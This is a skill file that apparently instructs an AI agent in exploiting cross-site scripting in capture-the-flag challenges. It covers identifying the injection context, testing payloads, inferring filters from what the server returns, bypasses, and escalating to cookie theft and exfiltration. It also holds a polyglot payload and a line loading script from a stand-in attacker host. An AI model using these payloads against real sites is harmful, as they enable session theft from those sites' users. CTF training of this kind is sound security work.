---
name: xss
description: >
  Use when you need to exploit XSS vulnerabilities. Fire when: a reflected input
  is discovered in the page response, a form or URL parameter echoes back in HTML
  context, you need to bypass an XSS filter (WAF, input sanitization, HTML entity
  encoding, tag stripping), the challenge tag or hints mention xss, you see a search
  bar, comment field, or any user input reflected in the rendered page. Do NOT fire
  for DOM-only XSS where no server reflection occurs — use js-dom skill instead.
---

# XSS Exploitation Methodology

## Step 1: Identify the context

Where does your input appear in the rendered HTML? The context determines the payload shape:

- **Plain HTML body**: `<script>`, `<img onerror=>`, `<svg onload=>` work directly.
- **Inside an HTML attribute**: Close the attribute first. `"><script>alert(1)</script>`, or event handler: `" onmouseover="alert(1)`
- **Inside a `<script>` block/JS string**: Break out of the string context. `</script><script>alert(1)</script>` or `'; alert(1); '`
- **Inside a tag name or event handler**: If `<` and `>` are stripped, use event handlers on existing elements: `onerror=alert(1)` on an `<img>` or `<svg>`

**Why this matters**: Using the wrong context's payload against a filtered target is the single most common failure. If `<script>` is stripped, try event handlers on elements the page already renders.

## Step 2: Test with a minimal payload

Start with the simplest possible payload for the identified context:
- HTML body: `<img src=x onerror=alert(1)>`
- Attribute: `" onmouseover="alert(1)`
- JS context: `';alert('x');//`

If the payload is blocked or the input is not reflected, you have identified a filter. Go to Step 3.

## Step 3: Infer the filter from what changes

Send your test payload and compare what the server returns versus what you sent:

| What happened | Likely filter | Bypass approach |
|---|---|---|
| `<script>` removed but `<>` allowed | Script tag filter | Use event handlers: `<svg onload=...>`, `<img onerror=...>` |
| `<` and `>` stripped or `&lt;` encoded | HTML entity encoding | No HTML tags possible; try JS context if input reaches `<script>` block |
| Quotes escaped | Quote filter | Use unquoted attributes: `onerror=alert(1)`, or use backtick/template literals in JS |
| `alert`/`script` keywords blocked | Keyword blacklist | Use different function: `confirm()`, `prompt()`, or obfuscate: `al\u0065rt()`, `"alert".split('').join('')` |
| Payload returned unchanged | Server-side XSS impossible | Try DOM-based path — input may reach JavaScript that dynamically inserts it |
| Nothing reflected at all | Check URL encoding, POST body, hidden parameters |

**The key principle**: The filter tells you what to try next. Each failed payload gives information. Never repeat the same payload shape — adapt.

## Step 4: Escalate from proof to extraction

Once you confirm XSS works, the flag retrieval depends on the challenge:
- **DOM alert**: The flag may appear in an `alert()` dialog when the payload executes. Note the exact text.
- **Cookie theft**: `document.cookie` may contain the flag or a session token that leads to it.
- **Internal navigation**: Your payload may need to fetch another page and exfiltrate its content.
- **Be careful with the judge**: Some challenges expect the exact flag in a specific format. Read the challenge description carefully.

## Common bypass patterns

- Event handlers with no quotes: `<svg onload=fetch('/flag')>`
- Encoding bypasses in JavaScript context: `"\x61\x6c\x65\x72\x74"` for `alert`
- Polyglot payloads that work across multiple contexts: `jaVasCript:/*-/*`/*\`/*'`/*"/**/(/**/oNcliCk=alert())//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/—!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`
- When `<script src=` is blocked but external loading is allowed: `<script src=//attacker.com/payload>`
- Template literals for quote bypass: `` `alert(document.cookie)` ``
